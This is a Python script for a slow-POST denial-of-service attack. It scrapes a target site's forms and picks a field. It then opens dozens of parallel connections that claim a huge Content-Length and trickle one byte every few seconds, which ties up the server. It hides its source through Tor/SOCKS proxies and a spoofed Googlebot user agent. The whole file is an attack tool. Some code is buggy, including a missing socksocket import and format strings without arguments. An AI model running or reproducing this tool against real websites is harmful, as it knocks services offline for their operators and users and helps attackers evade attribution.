#!/usr/bin/env python

import requests
import requesocks
import socket
import sys
import re
import random
import time

from bs4 import BeautifulSoup
from urlparse import urlparse
from multiprocessing import Process
from argparse import ArgumentParser

MAX_CONNECTIONS      = 50
SLEEP_TIME           = 10
PROXY_ADDRESS        = '127.0.0.1'
PROXY_PORT           = 9050
DEFAULT_USER_AGENT   = '%s' %\
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'

def form_to_dict(form):
    
    form_dict = {
        'action' : form.get('action', ''),
        'method' : form.get('method', 'post'),
        'id' : form.get('id', ''),
        'class' : form.get('class', ''),
        'inputs' : [],
    }
    
    for index, input_field in enumerate(form.findAll('input')):

        form_dict['inputs'].append({
            'id' : input_field.get('id', ''),
            'class' : input_field.get('class', ''),
            'name' : input_field.get('name', ''),
            'value' : input_field.get('value', ''),
            'type' : input_field.get('type', ''),
        })
    return form_dict

def get_forms(response):
    
    soup = BeautifulSoup(response.text)

    forms = []
    for form in soup.findAll('form'):
        
        forms.append(form_to_dict(form))

    return forms

def print_forms(forms):

    for index,form in enumerate(forms):
        print 'Form #%d --> id: %s --> class: %s --> action: %s' %\
                (index, form['id'], form['class'], form['action'])

def print_inputs(inputs):

    for index, input_field in enumerate(inputs):
        print 'Input #%d: %s' %\
            (index, input_field['name'])

def choose_form(response):
    forms = get_forms(response)

    return make_choice(print_forms,
                'Please select a form from the list above.',
                forms,
                'form')

def choose_input(form):

    return make_choice(print_inputs,
                    'Please select a form field from the list above.',
                    form['inputs'],
                    'input')

def make_choice(menu_function, prompt, choices, field):

    while True:
        try:
            menu_function(choices)
            index = int(raw_input('Enter %s number: ' % field))
            return choices[index]
        except IndexError:
            print 'That is not a valid choice.'
        except ValueError:
            print 'That is not a valid choice.'
        print

def craft_headers(path, host, user_agent, param, cookies):

    return '\n'.join([

        'POST %s HTTP/1.1' % path,
        'Host: %s' % host,
        'Connection: keep-alive',
        'Content-Length: 100000000',
        'User-Agent: %s' % user_agent,
        'cookies',
        '%s=' % param, 
    ])

def host_from_url(url):

    p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
    m = re.search(p,url)
    return m.group('host')

def port_from_url(url):

    p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
    m = re.search(p,url)
    port = m.group('port')
    if port == '':
        return 80
    return int(port)

def select_session(configs):

    if 'proxies' in configs:
        session = requesocks.session()
        proxy = configs['proxies'][0]
        session.proxies = {
                'http': 'socks4://%s:%d' % (proxy['address'],proxy['port']),
                'https': 'socks4://%s:%d' % (proxy['address'],proxy['port']),
        }
    else:
        session = requests.session()

    return session


def parse_args():

    parser = ArgumentParser()

    parser.add_argument('--target',
                    dest='target',
                    type=str,
                    required=True,
                    help='Target url')

    parser.add_argument('--connections',
                    dest='connections',
                    type=int,
                    required=False,
                    default=MAX_CONNECTIONS,
                    help='The number of connections to run simultaneously (default 50)')
    
    parser.add_argument('--user-agents',
                    dest='user_agent_file',
                    type=str,
                    required=False,
                    help='Load user agents from file')

    parser.add_argument('--proxies',
                    dest='proxy_file',
                    type=str,
                    nargs='*',
                    required=False,
                    help='Load user agents from file')
    
    parser.add_argument('--sleep',
                    dest='sleep_time',
                    type=int,
                    required=False,
                    metavar='<seconds>',
                    default=SLEEP_TIME,
                    help='Wait <seconds> seconds before sending each byte.')

    return parser.parse_args()
    
def configure():

    args = parse_args()
    configs = {}

    if args.proxy_file is not None:
        if args.proxy_file == []:
            configs['proxies'] = [{
                        'address' : PROXY_ADDRESS,
                        'port' : PROXY_PORT,
            }]
        else:
            with open(args.proxy_file) as fd:
                configs['proxies'] = []
                for line in fd:
                    proxy = line.split()
                    configs['proxies'].append({
                        'address' : proxy[0],
                        'port' : proxy[1],
                    })

    configs['user_agents'] = [DEFAULT_USER_AGENT]
    if args.user_agent_file is not None:
        with open(args.user_agent_file) as fd:
            configs['user_agents'] += fd.read().split('\n')

    # select form and target POST parameter, and set cookies 
    session = select_session(configs)
    response = session.get(args.target)
    form = choose_form(response)
    configs['param'] = choose_input(form)['name']
    configs['cookies'] = response.headers.get('set-cookie', '')

    # select target URL using selected form
    parsed_url = urlparse(args.target)
    if form['action'] != '':
        if form['action'].startswith('/'):
            configs['target'] = 'http://%s%s' % (parsed_url.netloc, form['action'])
    else:
        configs['target'] = args.target

    # set path, HTTP host and port 
    configs['path'] = parsed_url.path,
    configs['host'] = host_from_url(configs['target'])
    configs['port'] = port_from_url(configs['target'])

    # set connections and sleep_time
    configs['connections'] = args.connections
    configs['sleep_time'] = args.sleep_time

    return configs

def launch_attack(i, configs, headers):

    try:

        # establish initial connection to target
        print '[worker %d] Establishing connection'

        # if we're using proxies, then we use socksocket() instead of socket()
        if 'proxies' in configs:

            # select proxy
            proxy = random.choice(configs['proxies'])
            print '[worker %d] Using socks proxy %s:%d' % (proxy['address'], proxy['port'])

            # connect through proxy
            sock = socksocket()
            sock.setproxy(PROXY_TYPE_SOCK4, proxy['address'], proxy['port'])

        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((configs['host'], configs['port']))

        print '[worker %d] Successfully connected to %s' % (i, configs['target'])

        # start dos attack
        print '[worker %d] Beginning HTTP session... sending headers' % i
        sock.send(headers)
        while True:
            print '[worker %d] Sending one byte to target.' % i
            sock.send("A")
            print '[worker %d] Sleeping for %d seconds' % (i, configs['sleep_time'])
            time.sleep(configs['sleep_time'])
    except KeyboardInterrupt:
        pass
    sock.close() 

if __name__ == '__main__':

    # set things up
    configs = configure()
    connections = []

    try:

        # spawn connections child processes to make connections
        for i in xrange(configs['connections']):

            # craft header with random user agent for each connection
            headers = craft_headers(configs['path'],
                                configs['host'],
                                random.choice(configs['user_agents']),
                                configs['param'],
                                configs['cookies'])

            # launch attack as child process
            p = Process(target=launch_attack, args=(i, configs, headers))
            p.start()
            connections.append(p)

        # wait for all processes to finish or user interrupt
        for c in connections:
            c.join()

    except KeyboardInterrupt:

        # terminate all connections on user interrupt
        print '\n[!] Exiting on User Interrupt'
        for c in connections:
            c.terminate()
        for c in connections:
            c.join()
